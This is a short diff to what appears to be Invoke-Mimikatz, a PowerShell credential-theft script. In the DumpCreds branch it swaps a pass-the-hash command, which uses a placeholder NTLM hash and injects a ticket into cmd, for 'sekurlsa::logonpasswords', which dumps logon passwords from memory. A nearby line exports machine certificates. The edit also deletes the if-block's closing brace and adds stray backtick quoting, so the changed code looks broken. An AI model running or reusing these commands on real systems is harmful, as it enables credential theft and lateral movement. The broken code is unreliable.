@@ -2707,8 +2707,7 @@ Function Main
 
 	if ($PsCmdlet.ParameterSetName -ieq "DumpCreds")
 	{
-		$ExeArgs = ""sekurlsa::pth /user:oaktree /domain:spiderlabs.local /ntlm:0123456789abcdefA /ptt cmd" exit"
-	}
+		$ExeArgs = `"sekurlsa::logonpasswords"`
     elseif ($PsCmdlet.ParameterSetName -ieq "DumpCerts")
     {
         $ExeArgs = "crypto::cng crypto::capi `"crypto::certificates /export`" `"crypto::certificates /export /systemstore:CERT_SYSTEM_STORE_LOCAL_MACHINE`" exit"
